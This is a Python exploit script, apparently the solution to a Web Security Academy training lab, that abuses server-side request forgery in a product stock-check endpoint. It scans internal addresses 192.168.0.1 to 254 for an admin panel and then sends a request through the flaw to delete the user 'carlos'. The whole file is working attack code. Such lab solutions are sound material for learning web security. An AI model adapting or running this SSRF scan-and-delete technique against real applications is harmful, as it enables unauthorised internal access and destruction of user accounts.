import requests

site = "0ac4008c036160d782c5ba29006a005f.web-security-academy.net"  # ← Replace with your own
stock_url = f"https://{site}/product/stock"

# Step 1: Enumerate backend host
admin_ip = None
for i in range(1, 255):
    ip = f"192.168.0.{i}"
    test_payload = {
        'stockApi': f'http://{ip}:8080/admin'
    }
    resp = requests.post(stock_url, data=test_payload)
    if resp.status_code == 200 and "carlos" in resp.text.lower():
        print(f"[✓] Found admin panel at: {ip}")
        admin_ip = ip
        break

# Step 2: Trigger the deletion of Carlos once discovered
if admin_ip:
    delete_payload = {
        'stockApi': f'http://{admin_ip}:8080/admin/delete?username=carlos'
    }
    delete_resp = requests.post(stock_url, data=delete_payload)
    print(f"[✓] Deletion response:\n{delete_resp.text}")
else:
    print("[!] Failed to locate internal admin interface.")
